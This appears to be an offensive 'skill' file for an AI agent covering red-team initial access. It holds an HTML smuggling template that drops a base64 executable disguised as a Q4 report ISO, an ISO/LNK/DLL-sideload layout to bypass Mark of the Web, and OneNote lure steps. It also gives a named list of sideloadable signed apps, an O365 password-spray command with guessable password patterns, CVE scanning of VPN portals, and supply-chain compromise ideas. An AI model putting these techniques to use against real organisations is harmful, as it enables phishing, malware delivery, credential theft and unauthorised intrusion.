---
name: initial-access
description: "Covers initial access via phishing, payload delivery, HTML smuggling, ISO/IMG/MOTW bypass, supply chain, credential stuffing, and exposed service exploitation. Signals: initial access, phishing, html smuggling, motw, payload delivery, foothold."
zh-signals: "初始访问:钓鱼、载荷投递、HTML 走私、ISO/IMG/MOTW 绕过、供应链、凭据填充、暴露服务利用。信号:初始访问,钓鱼,html走私,motw,载荷投递,突破口。"
when-to-use: Use when gaining initial access to a target — phishing, payload delivery, HTML smuggling, ISO/IMG/MOTW bypass, supply-chain, credential stuffing, exposed-service exploitation
metadata:
  type: offensive
  phase: initial-access
  mitre: TA0001
kill_chain:
  phase: [delivery]
  step: [3]
  attck_tactics: [TA0001]
depends_on: [recon-osint, exploit-development, edr-evasion]
feeds_into: [red-team-ops]
inputs: [target_profile, payload, evasion_technique]
outputs: [initial_foothold, delivery_report]
references:
  - references/social-engineering.md
---

# Initial Access

## When to Activate

- Planning initial access phase of red team engagement
- Developing phishing campaigns and payload delivery
- Bypassing email gateways and endpoint protection
- Exploiting exposed services for initial foothold

## Attack Vectors

### Email-Based (Phishing)

**Payload Delivery Formats** (bypass probability):
- `.exe` — almost always blocked
- `.iso/.img` — bypasses MOTW (Mark of the Web) on older Windows
- `.html` (smuggling) — high success rate
- `.pdf` with embedded JS — moderate
- `.one` (OneNote) — effective until patched
- `.lnk` + DLL sideload — high success in ISO container
- `.pptm/.ppsm/.accde` — often not covered by default protection

**Domain Preparation**:
- Domain age > 2 weeks (warm up with legitimate emails first)
- Use HTTPS with valid certificate
- Category: business/technology (not "newly registered")
- SPF, DKIM, DMARC properly configured
- Send legitimate emails first to build reputation

### HTML Smuggling

```html
<!-- Construct binary blob in JavaScript, trigger download -->
<html>
<body>
<script>
function smuggle() {
    var bin = atob("TVqQAAMAAAAEAAAA..."); // base64 PE
    var blob = new Blob([new Uint8Array([...bin].map(c=>c.charCodeAt(0)))], 
                        {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'Report_Q4_2026.iso';
    a.click();
}
smuggle();
</script>
<p>Loading document...</p>
</body>
</html>
```

### ISO/IMG Container (MOTW Bypass)

```
# Structure inside ISO:
├── Report.lnk          # Shortcut that executes the DLL
├── legitimate.exe      # Signed binary vulnerable to DLL sideload
└── payload.dll         # Malicious DLL loaded by legitimate.exe

# LNK target: legitimate.exe (which loads payload.dll from same directory)
# Files inside ISO don't inherit MOTW → bypass SmartScreen
```

**Note**: Windows 11 22H2+ propagates MOTW into ISO contents. Use alternative containers or delivery methods for newer targets.

### OneNote (.one) Payload

```
# Embed .bat/.hta behind fake "Double click to view" image
# User double-clicks → executes embedded script
# Effective because OneNote files are rarely blocked by email gateways
```

### DLL Sideloading

```bash
# Find legitimate signed EXE that loads DLL from CWD:
# 1. Use Process Monitor: filter for NAME NOT FOUND on DLL loads
# 2. Common targets: teams.exe (ffmpeg.dll), onedrive, slack
# 3. Place malicious DLL alongside legitimate EXE in delivery package

# Popular sideload targets:
# - Microsoft Teams: ffmpeg.dll
# - OneDrive: secur32.dll
# - Slack: libEGL.dll
# - VS Code: wlanapi.dll (portable mode)
```

## Credential-Based Access

### Credential Stuffing
```bash
# Use breach databases to test against target services
# Tools: Hydra, Burp Intruder, custom scripts
# Targets: VPN portals, OWA, O365, Citrix, RDP

# O365 password spray (avoid lockout: 1 attempt per user per hour)
# Tools: MSOLSpray, Ruler, MailSniper
python3 msolspray.py --userlist users.txt --password 'Company2026!' --url https://login.microsoftonline.com

# Common patterns to try:
# Season+Year: Summer2026!, Winter2025!
# Company+digits: CompanyName1!, Corp2026#
# Month+Year: May2026!, January2026!
```

### Exposed Service Exploitation
```bash
# VPN (Fortinet, Pulse Secure, Citrix, Palo Alto)
# Check for known CVEs: CVE-2023-27997 (Fortinet), CVE-2024-3400 (PAN-OS)
searchsploit fortinet
nuclei -u https://vpn.target.com -t cves/ -severity critical

# Exchange (ProxyShell, ProxyNotShell, OWASSRF)
# RDP (BlueKeep CVE-2019-0708 for legacy)
# Jenkins, GitLab, Confluence (common RCE CVEs)
```

### Supply Chain
```
# Compromise trusted software update mechanism
# Inject into CI/CD pipeline
# Typosquatting on package managers (npm, PyPI)
# Compromise developer workstation → push malicious commit
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
